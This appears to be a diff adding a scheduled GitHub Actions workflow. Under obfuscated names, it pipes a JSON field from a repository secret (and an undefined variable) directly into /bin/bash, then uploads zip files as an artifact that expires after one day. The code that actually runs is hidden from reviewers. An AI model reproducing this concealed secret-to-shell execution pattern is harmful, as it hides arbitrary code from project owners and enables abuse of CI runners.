@@ -1,0 +1,27 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '8 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          sa4: ${{ secrets.sa4 }}
+        run: |
+          printf '%s' "$sa4" | jq -r .dcq6 | /bin/bash
+          echo $pywho51043 | jq -r .xxkw9 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: DH2Vs5aq
+          path: "*.zip"
+          retention-days: 1
